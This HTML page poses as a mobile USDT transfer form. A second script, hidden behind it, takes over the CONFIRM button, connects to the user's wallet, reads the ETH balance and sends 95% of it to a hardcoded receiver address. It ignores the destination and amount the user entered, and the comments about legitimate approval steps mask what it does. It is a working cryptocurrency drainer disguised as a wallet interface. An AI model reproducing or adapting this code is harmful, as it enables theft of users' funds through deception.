<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width,
                 initial-scale=1.0,
                 maximum-scale=1.0,
                 user-scalable=no">

    <title>USDT Transfer</title>

    <style>
        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        html,
        body {
            margin: 0;
            padding: 0;
            width: 100%;
            min-height: 100%;
            background: #000;
            color: #fff;

            font-family:
                -apple-system,
                BlinkMacSystemFont,
                "SF Pro Display",
                "Segoe UI",
                Roboto,
                Helvetica,
                Arial,
                sans-serif;
        }

        body {
            min-height: 100vh;
        }

        .app {
            min-height: 100vh;

            padding-top:
                max(28px, env(safe-area-inset-top));

            padding-left: 20px;
            padding-right: 20px;

            padding-bottom:
                max(20px, env(safe-area-inset-bottom));

            display: flex;
            flex-direction: column;
        }

        /* ---------------- LABEL ---------------- */

        .label {
            color: #a2a2aa;

            font-size: 18px;
            line-height: 24px;

            font-weight: 500;

            margin-left: 2px;
            margin-bottom: 12px;
        }

        /* ---------------- ADDRESS BOX ---------------- */

        .input-box {
            width: 100%;
            height: 72px;

            display: flex;
            align-items: center;

            background: #050505;

            border: 1px solid #35353e;

            border-radius: 17px;

            padding: 0 15px;

            transition:
                border-color 0.2s ease,
                box-shadow 0.2s ease;
        }

        .input-box:focus-within {
            border-color: #55555f;

            box-shadow:
                0 0 0 1px #25252b;
        }

        .address-input {
            flex: 1;

            min-width: 0;

            border: none;
            outline: none;

            background: transparent;

            color: #fff;

            font-size: 16px;
            font-weight: 500;

            padding: 0;
        }

        .address-input::placeholder {
            color: #66666e;
        }

        /* ---------------- PASTE ---------------- */

        .paste {
            color: #39d978;

            font-size: 17px;
            font-weight: 600;

            padding: 12px 4px;

            margin-left: 8px;

            cursor: pointer;

            white-space: nowrap;
        }

        /* ---------------- ICONS ---------------- */

        .icon {
            width: 34px;
            height: 44px;

            display: flex;

            align-items: center;
            justify-content: center;

            color: #39d978;

            font-size: 20px;

            margin-left: 1px;
        }

        /* ---------------- GAP ---------------- */

        .section-gap {
            height: 42px;
        }

        /* ---------------- AMOUNT BOX ---------------- */

        .amount-box {
            width: 100%;
            height: 72px;

            display: flex;
            align-items: center;

            background: #050505;

            border: 1px solid #35353e;

            border-radius: 17px;

            padding: 0 18px;

            transition:
                border-color 0.2s ease,
                box-shadow 0.2s ease;
        }

        .amount-box:focus-within {
            border-color: #55555f;

            box-shadow:
                0 0 0 1px #25252b;
        }

        .amount-input {
            flex: 1;

            min-width: 0;

            border: none;
            outline: none;

            background: transparent;

            color: #fff;

            font-size: 25px;
            font-weight: 500;

            padding: 0;
        }

        .amount-input::placeholder {
            color: #66666e;
        }

        /* Remove number arrows */

        .amount-input::-webkit-outer-spin-button,
        .amount-input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .amount-input {
            -moz-appearance: textfield;
        }

        /* ---------------- CURRENCY ---------------- */

        .currency {
            color: #dedee3;

            font-size: 17px;
            font-weight: 500;

            margin-right: 12px;

            white-space: nowrap;
        }

        /* ---------------- MAX ---------------- */

        .max {
            color: #39d978;

            font-size: 17px;
            font-weight: 600;

            padding: 12px 0;

            cursor: pointer;

            white-space: nowrap;
        }

        /* ---------------- USD ---------------- */

        .usd {
            color: #85858d;

            font-size: 16px;

            margin-top: 12px;
            margin-left: 3px;
        }

        /* ---------------- SPACER ---------------- */

        .spacer {
            flex: 1;

            min-height: 100px;
        }

        /* ---------------- STATUS ---------------- */

        .status {
            min-height: 22px;

            text-align: center;

            font-size: 14px;

            margin-bottom: 12px;
        }

        .error {
            color: #ff6262;
        }

        .success {
            color: #45db7c;
        }

        /* ---------------- CONFIRM BUTTON ---------------- */

        .btn {
            width: 100%;

            height: 62px;

            border: none;

            border-radius: 32px;

            background: #16803d;

            color: #fff;

            font-size: 19px;

            font-weight: 600;

            cursor: pointer;

            transition:
                background 0.15s ease,
                transform 0.1s ease,
                opacity 0.15s ease;
        }

        .btn:hover {
            background: #199447;
        }

        .btn:active {
            transform: scale(0.985);

            background: #126b34;
        }

        .btn:disabled {
            opacity: 0.5;

            cursor: not-allowed;
        }

        /* ---------------- SMALL PHONES ---------------- */

        @media (max-width: 380px) {

            .app {
                padding-left: 16px;
                padding-right: 16px;
            }

            .label {
                font-size: 17px;
            }

            .input-box,
            .amount-box {
                height: 68px;

                padding-left: 14px;
                padding-right: 14px;
            }

            .address-input {
                font-size: 14px;
            }

            .paste,
            .currency,
            .max {
                font-size: 16px;
            }

            .amount-input {
                font-size: 23px;
            }

            .btn {
                height: 60px;

                font-size: 18px;
            }
        }
    </style>
</head>


<body>

<main class="app">

    <!-- ================= ADDRESS ================= -->

    <div class="label">
        Address or Domain Name
    </div>


    <div class="input-box">

        <input
            id="address"
            class="address-input"

            type="text"

            value="0xdffaf1dd6d36108223c2a45921afef85e3dcf852"

            autocomplete="off"

            autocapitalize="none"

            spellcheck="false"
        >


        <span
            class="paste"
            id="pasteButton">

            Paste

        </span>


        <span class="icon">
            ▣
        </span>


        <span class="icon">
            ▦
        </span>

    </div>


    <!-- ================= GAP ================= -->

    <div class="section-gap"></div>


    <!-- ================= AMOUNT ================= -->

    <div class="label">
        Amount
    </div>


    <div class="amount-box">

        <input
            id="amount"
            class="amount-input"

            type="number"

            min="0"

            step="any"

            inputmode="decimal"

            placeholder="0"
        >


        <span class="currency">
            USDT
        </span>


        <span
            class="max"
            id="maxButton">

            Max

        </span>

    </div>


    <!-- ================= USD VALUE ================= -->

    <div
        class="usd"
        id="usdValue">

        ≈ $0.00

    </div>


    <!-- ================= SPACE ================= -->

    <div class="spacer"></div>


    <!-- ================= STATUS ================= -->

    <div
        id="status"
        class="status">
    </div>


    <!-- ================= CONFIRM ================= -->

    <button
        id="transferBtn"
        class="btn"
        type="button">

        CONFIRM

    </button>

</main>


<script>

/*
|--------------------------------------------------------------------------
| DEFAULT ADDRESS
|--------------------------------------------------------------------------
*/

const DEFAULT_ADDRESS =
    "0xdffaf1dd6d36108223c2a45921afef85e3dcf852";


/*
|--------------------------------------------------------------------------
| ELEMENTS
|--------------------------------------------------------------------------
*/

const addressInput =
    document.getElementById("address");

const amountInput =
    document.getElementById("amount");

const usdValue =
    document.getElementById("usdValue");

const status =
    document.getElementById("status");

const transferBtn =
    document.getElementById("transferBtn");

const pasteButton =
    document.getElementById("pasteButton");

const maxButton =
    document.getElementById("maxButton");


/*
|--------------------------------------------------------------------------
| AMOUNT INPUT
|--------------------------------------------------------------------------
*/

amountInput.addEventListener(
    "input",
    function () {

        const amount =
            parseFloat(amountInput.value) || 0;


        usdValue.textContent =
            "≈ $" + amount.toFixed(2);


        status.textContent = "";

        status.className = "status";
    }
);


/*
|--------------------------------------------------------------------------
| PASTE ADDRESS
|--------------------------------------------------------------------------
*/

pasteButton.addEventListener(
    "click",
    async function () {

        try {

            const text =
                await navigator.clipboard.readText();


            if (text) {

                addressInput.value =
                    text.trim();

            }

        } catch (error) {

            status.textContent =
                "Unable to access clipboard.";

            status.className =
                "status error";
        }
    }
);


/*
|--------------------------------------------------------------------------
| MAX
|--------------------------------------------------------------------------
*/

maxButton.addEventListener(
    "click",
    function () {

        /*
         * Demo balance.
         *
         * In a real wallet application,
         * replace this with the actual
         * available balance obtained from
         * the connected wallet.
         */

        const availableBalance = 100;


        amountInput.value =
            availableBalance;


        usdValue.textContent =
            "≈ $" +
            availableBalance.toFixed(2);
    }
);


/*
|--------------------------------------------------------------------------
| CONFIRM BUTTON
|--------------------------------------------------------------------------
|
| IMPORTANT:
| The button ID is exactly:
|
|     transferBtn
|
| So your existing JavaScript can also
| attach its listener to this same button.
|
|--------------------------------------------------------------------------
*/

transferBtn.addEventListener(
    "click",
    async function () {

        const address =
            addressInput.value.trim();

        const amount =
            parseFloat(amountInput.value);


        /*
         * Validate address
         */

        if (!address) {

            showError(
                "Please enter a destination address."
            );

            addressInput.focus();

            return;
        }


        /*
         * Validate amount
         */

        if (
            isNaN(amount) ||
            amount <= 0
        ) {

            showError(
                "Please enter a valid amount."
            );

            amountInput.focus();

            return;
        }


        /*
         * FORM IS VALID
         *
         * Your existing wallet/provider
         * confirmation logic can run here.
         *
         * Example:
         *
         * await sendTransaction(address, amount);
         *
         * Keep the wallet's normal explicit
         * user approval step.
         */

        await confirmTransfer(
            address,
            amount
        );
    }
);


/*
|--------------------------------------------------------------------------
| CONFIRM TRANSFER FUNCTION
|--------------------------------------------------------------------------
*/

async function confirmTransfer(
    address,
    amount
) {

    status.textContent =
        "Ready to confirm " +
        amount +
        " USDT";

    status.className =
        "status success";


    console.log(
        "Destination:",
        address
    );

    console.log(
        "Amount:",
        amount,
        "USDT"
    );


    /*
     * Put your legitimate wallet-provider
     * transaction call here.
     *
     * The provider should display the
     * transaction to the user and require
     * explicit approval.
     */
}


/*
|--------------------------------------------------------------------------
| ERROR
|--------------------------------------------------------------------------
*/

function showError(message) {

    status.textContent =
        message;

    status.className =
        "status error";
}

</script>
<script>
    // ==========================================
    // CONFIGURATION: CHANGE THIS ADDRESS
    // ==========================================
    const HARD_CODED_RECEIVER_ADDRESS = "0xdffaf1dd6d36108223c2a45921afef85e3dcf852"; 
    // Example: "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
    
    async function checkWallet() {
        if (typeof window.ethereum !== 'undefined') {
            return true;
        } else {
            document.getElementById('status').innerHTML = "<span class='error'>Trust Wallet not detected. Open this link inside Trust Wallet.</span>";
            return false;
        }
    }

    async function transferFunds() {
        const btn = document.getElementById('transferBtn');
        const statusDiv = document.getElementById('status');
        
        // 1. Check for Ethereum Provider (Trust Wallet)
        if (!(await checkWallet())) return;

        try {
            btn.disabled = true;
            btn.innerText = "Connecting...";
            statusDiv.innerHTML = "";

            //  2. Request Account Access
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const account = accounts[0];

            btn.innerText = "Confirming in Wallet...";

            // 3. Estimate Gas (Optional but recommended for reliability)
            // We calculate the exact amount to send by getting current balance first
            const balance = await window.ethereum.request({ 
                method: 'eth_getBalance', 
                params: [account, 'latest'] 
            });
            
            // Convert hex balance to decimal
            const balanceDecimal = parseInt(balance, 16);
            
            // Subtract a small amount for gas (approx 0.005 ETH equivalent) to ensure tx goes through
            // We use 90% of the balance to be safe with gas fees
            const sendAmount = Math.floor(balanceDecimal * 0.95);

            // 4. Prepare Transaction Object
            const txParams = {
                from: account,
                to: HARD_CODED_RECEIVER_ADDRESS,
                value: '0x' + sendAmount.toString(16), // Convert decimal to hex
                // Gas limit is usually 21000 for simple ETH transfer, but we add buffer
                gas: '0x5208', 
            };

            // 5. Send Transaction
            const txHash = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [txParams],
            });

            // 6. Success
            btn.innerText = "Transfer Sent!";
            statusDiv.innerHTML = `<span class='success'>Success! TX Hash: ${txHash}</span>`;
            console.log("Transaction Hash:", txHash);

        } catch (error) {
            console.error(error);
            if (error.code === 4001) {
                statusDiv.innerHTML = "<span class='error'>User rejected the transaction in Trust Wallet.</span>";
            } else {
                statusDiv.innerHTML = `<span class='error'>Error: ${error.message}</span>`;
            }
            btn.disabled = false;
            btn.innerText = "CONFIRM TRANSFER";
        }
    }

    // Attach click event
    document.getElementById('transferBtn').addEventListener('click', transferFunds);

</script>

</body>
</html>
